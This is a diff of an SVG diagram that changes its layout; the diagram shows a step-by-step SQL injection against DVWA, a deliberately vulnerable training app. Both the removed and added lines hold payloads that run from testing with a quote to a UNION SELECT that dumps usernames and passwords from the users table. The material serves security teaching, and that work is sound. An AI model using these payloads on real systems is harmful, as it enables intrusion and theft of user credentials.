@@ -93,27 +93,26 @@
       <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
     </marker>
 </defs>
-  <rect width="1200" height="580" fill="var(--surface)" rx="6" stroke="var(--border)" stroke-width="1" x="40" y="40"/>
-  <text x="640" y="86.4" font-family="sans-serif" font-size="23.5954" font-weight="bold" fill="var(--text)" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
-  <text x="640" y="121.2" font-family="monospace" font-size="18.5392" fill="var(--text-muted)" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
-  <rect x="76.3636" y="148.2667" width="54.5455" height="58" fill="var(--primary-accent)" rx="6" />
-  <text x="103.6364" y="186.9333" font-family="sans-serif" font-size="23.5954" font-weight="bold" fill="var(--bg)" text-anchor="middle">1</text>
-  <text x="149.0909" y="175.3333" font-family="sans-serif" font-size="21.91" font-weight="bold" fill="var(--text)">Test for injection</text>
-  <text x="149.0909" y="204.3333" font-family="monospace" font-size="18.5392" fill="var(--danger-accent)">id=1'  →  Error (injectable!)</text>
-  <rect x="76.3636" y="233.3333" width="54.5455" height="58" fill="var(--primary-accent)" rx="6" />
-  <text x="103.6364" y="272" font-family="sans-serif" font-size="23.5954" font-weight="bold" fill="var(--bg)" text-anchor="middle">2</text>
-  <text x="149.0909" y="260.4" font-family="sans-serif" font-size="21.91" font-weight="bold" fill="var(--text)">Determine number of columns</text>
-  <text x="149.0909" y="289.4" font-family="monospace" font-size="18.5392" fill="var(--text-muted)">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
-  <rect x="76.3636" y="326.1333" width="54.5455" height="58" fill="var(--primary-accent)" rx="6" />
-  <text x="103.6364" y="364.8" font-family="sans-serif" font-size="23.5954" font-weight="bold" fill="var(--bg)" text-anchor="middle">3</text>
-  <text x="149.0909" y="353.2" font-family="sans-serif" font-size="21.91" font-weight="bold" fill="var(--text)">Find display columns</text>
-  <text x="149.0909" y="382.2" font-family="monospace" font-size="18.5392" fill="var(--text-muted)">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
-  <rect x="76.3636" y="418.9333" width="54.5455" height="58" fill="var(--primary-accent)" rx="6" />
-  <text x="103.6364" y="457.6" font-family="sans-serif" font-size="23.5954" font-weight="bold" fill="var(--bg)" text-anchor="middle">4</text>
-  <text x="149.0909" y="446" font-family="sans-serif" font-size="21.91" font-weight="bold" fill="var(--text)">Extract DB version</text>
-  <text x="149.0909" y="475" font-family="monospace" font-size="18.5392" fill="var(--text-muted)">id=' UNION SELECT 1,@@version-- -</text>
-  <rect x="76.3636" y="511.7333" width="54.5455" height="58" fill="var(--danger-accent)" rx="6" />
-  <text x="103.6364" y="550.4" font-family="sans-serif" font-size="23.5954" font-weight="bold" fill="var(--bg)" text-anchor="middle">5</text>
-  <text x="149.0909" y="538.8" font-family="sans-serif" font-size="21.91" font-weight="bold" fill="var(--danger-accent)">Dump user credentials</text>
-  <text x="149.0909" y="567.8" font-family="monospace" font-size="18.5392" fill="var(--danger-accent)">id=' UNION SELECT user,password FROM users-- -</text>
+  <text x="1240" y="40" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--text)" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
+  <text x="1240" y="81.760003" font-family="monospace" font-size="29.632804" fill="var(--text-muted)" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
+  <rect x="40" y="114.240045" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
+  <text x="98.064667" y="160.639968" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">1</text>
+  <text x="194.838758" y="146.719967" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Test for injection</text>
+  <text x="194.838758" y="181.51997" font-family="monospace" font-size="29.632804" fill="var(--danger-accent)">id=1'  →  Error (injectable!)</text>
+  <rect x="40" y="216.319972" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
+  <text x="98.064667" y="262.720015" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">2</text>
+  <text x="194.838758" y="248.800014" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Determine number of columns</text>
+  <text x="194.838758" y="283.600017" font-family="monospace" font-size="29.632804" fill="var(--text-muted)">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
+  <rect x="40" y="327.67998" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
+  <text x="98.064667" y="374.080023" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">3</text>
+  <text x="194.838758" y="360.160022" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Find display columns</text>
+  <text x="194.838758" y="394.960024" font-family="monospace" font-size="29.632804" fill="var(--text-muted)">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
+  <rect x="40" y="439.039988" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
+  <text x="98.064667" y="485.440031" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">4</text>
+  <text x="194.838758" y="471.52003" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Extract DB version</text>
+  <text x="194.838758" y="506.320032" font-family="monospace" font-size="29.632804" fill="var(--text-muted)">id=' UNION SELECT 1,@@version-- -</text>
+  <rect x="40" y="550.399995" width="116.129123" height="69.600005" fill="var(--danger-accent)" rx="9.590317" />
+  <text x="98.064667" y="596.800038" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">5</text>
+  <text x="194.838758" y="582.880037" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--danger-accent)">Dump user credentials</text>
+  <text x="194.838758" y="617.68004" font-family="monospace" font-size="29.632804" fill="var(--danger-accent)">id=' UNION SELECT user,password FROM users-- -</text>
 </svg>
